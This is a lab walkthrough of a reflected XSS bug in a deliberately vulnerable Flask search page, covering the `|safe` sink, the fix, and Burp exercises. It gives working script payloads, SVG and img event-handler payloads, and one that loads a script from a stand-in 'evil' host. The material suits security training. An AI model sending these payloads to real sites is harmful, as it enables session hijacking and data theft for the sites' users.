# Walkthrough — xss-reflected

## 1. Context

The app exposes a "post search" page. You type a query on `/`, the form submits a `GET /search?q=<term>` request, and the server filters a hardcoded list of three seeded posts by case-insensitive substring match on the title, then renders the matches in a list. Above the list, the page echoes a header: `Results for: <your query>`. That header is where the bug lives.

## 2. Spot the bug

Two files are in scope. The view in [`vulnerable/app.py`](./vulnerable/app.py) looks clean:

```python
@app.route("/search")
def search():
    q = request.args.get("q", "")
    results = [p for p in POSTS if q.lower() in p["title"].lower()]
    return render_template("search.html", q=q, results=results)
```

The source is obvious (`request.args.get("q", "")`), but there's no unescaped concatenation in the view itself. The sink lives one file over, in [`vulnerable/templates/search.html`](./vulnerable/templates/search.html):

```jinja
<h1>Results for: {{ q|safe }}</h1>
```

`{{ q }}` on its own would be safe — Jinja autoescapes by default, converting `<`, `>`, `&`, `'`, and `"` into HTML entities before they reach the response. The `|safe` filter explicitly turns that protection off for this expression, telling Jinja "this value is already trusted HTML, emit it verbatim." It isn't. It came straight from `request.args`.

Three quick lessons from this shape:

- The source (`app.py`) and the sink (`search.html`) are in different files. A review that only reads view functions misses XSS bugs routinely.
- `|safe` is a reliable XSS red flag in Jinja projects. `grep -rn '|safe' templates/` is a cheap first-pass audit.
- Autoescape being *on* globally is no guarantee — any single filter, `Markup(...)` call, or `{% autoescape false %}` block disables protection at that spot.

## 3. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8002/>, submit `flask` through the form once to capture the traffic, then right-click the `GET /search?q=flask` request in **Proxy → HTTP history** and choose **Send to Repeater**.

### A note on URL encoding

Same parser rule as the previous atom: the HTTP request line is `METHOD SP URI SP VERSION`, so **literal spaces inside the URI break the request** — `400 Bad Request` before your payload is ever parsed as HTML. Encode every space as `%20`. Other characters common in XSS payloads (`<`, `>`, `'`, `"`, `/`) are legal inside a query string per RFC 3986 and travel fine as-is.

If you'd rather not think about it, paste the decoded payload into Repeater, select it, and press **Ctrl+U** — Burp will percent-encode every unsafe character. Both forms hit the app as the same string after URL-decoding, so use whichever is easier to edit.

Each step below shows a decoded **Payload** (for reading) and a **Request line** (paste-ready, with `%20` substituted for any spaces).

### Step 1 — Confirm the reflection

Payload:

```
hello
```

Request line in Repeater:

```
GET /search?q=hello HTTP/1.1
Host: 127.0.0.1:8002
```

Response body contains:

```html
<h1>Results for: hello</h1>
```

The input came back unchanged in the page. That's the reflection — your query is echoed into the response HTML. On its own this isn't a bug (every search page does this); the question is *how* the echo is done.

### Step 2 — Confirm HTML injection

Payload:

```
<b>hello</b>
```

Request line in Repeater:

```
GET /search?q=<b>hello</b> HTTP/1.1
Host: 127.0.0.1:8002
```

Response body contains the header with the `<b>` tag intact, not escaped to entities:

```html
<h1>Results for: <b>hello</b></h1>
```

Render the response in the browser (the **Render** tab in Repeater, or open it from Proxy history) and the word "hello" shows up **bold**. That's the proof: your angle brackets were not encoded — they were parsed as markup. At this point the app will accept any HTML you send, including `<script>`.

### Step 3 — Execute JavaScript

Payload:

```
<script>alert(document.domain)</script>
```

Request line in Repeater:

```
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: 127.0.0.1:8002
```

Open the response in the browser's render view. An alert box pops up showing `127.0.0.1:8002` — JavaScript you sent is running inside the app's origin. Anything the app itself can do in the browser (read cookies on this origin, make authenticated requests from the user's session, mutate the DOM, exfiltrate the page body) this script can now do too.

A note on why this particular payload works here. The server drops your `<script>` tag into the **initial HTML response**, which the browser parses top-to-bottom on page load — inline script tags encountered during that parse always execute. In the future `xss-dom` atom the vulnerability lives entirely in client-side JavaScript that writes user input into the DOM *after* the page has already loaded, and browsers deliberately **do not** execute script tags inserted via `innerHTML` post-load. The exact same literal payload that wins here would silently do nothing there. The class is the same ("attacker-controlled string becomes JavaScript"), but the sink is different, and the payload has to match the sink.

## 4. Exploitation via browser (secondary track, optional)

The same three payloads pasted directly into the browser address bar (or the form input on `/`):

1. `http://127.0.0.1:8002/search?q=hello`
2. `http://127.0.0.1:8002/search?q=<b>hello</b>`
3. `http://127.0.0.1:8002/search?q=<script>alert(document.domain)</script>`

The browser URL-encodes the characters that need encoding before sending, so the raw forms paste cleanly. On step 3 the alert fires as soon as the page loads — no Repeater required. Use this track for the very first pass to *feel* the impact, then move to Burp for everything after.

## 5. Why the fix works

See [`DIFF.md`](./DIFF.md) for the one-line change. In short: the fixed template drops `|safe` and emits `{{ q }}` through Jinja's default autoescape. Every character that could shift the HTML parser — `<`, `>`, `&`, `'`, `"` — becomes an HTML entity at render time. Run any payload from section 3 against <http://127.0.0.1:8102/search> to confirm: the page visibly shows `<script>alert(document.domain)</script>` as text, nothing executes.

## 6. Try it yourself

1. **Another vector: `<svg>`.** Send the payload `<svg onload=alert(1)>`. Shorter than the `<script>` variant and doesn't even need the literal string `script` to appear in the request. SVG is a canonical XSS vector — worth searching around for variants like `<svg><script>...</script></svg>`, `<iframe srcdoc=...>`, and event handlers on tags like `<body onload>`, `<details ontoggle>`, `<input onfocus autofocus>`. Each one matters when a filter blocks `<script>` specifically but lets other tags through.
2. **Change the filter, not the input.** Edit `vulnerable/templates/search.html` and replace `|safe` with `|e` (or just delete the filter — same effect, autoescape takes over). Rebuild the container, rerun step 3 — the page now shows the payload as visible text. You've just deployed the fix by hand; confirm the app still works as a search box with normal queries like `flask`.
3. **Reason about a blacklist.** Imagine the dev tried to "sanitize" by stripping the literal substring `<script`. Which of these payloads would still pop an alert under that rule, and why? (a) `<SCRIPT>alert(1)</SCRIPT>`, (b) `<img src=x onerror=alert(1)>`, (c) `<script src=//evil/x.js></script>`. You don't have to implement the blacklist — reason about each case, then send the payloads and check that your reasoning matches the server's behavior (note: *this* lab has no blacklist, so all three fire; the exercise is predicting what would happen under the hypothetical filter).
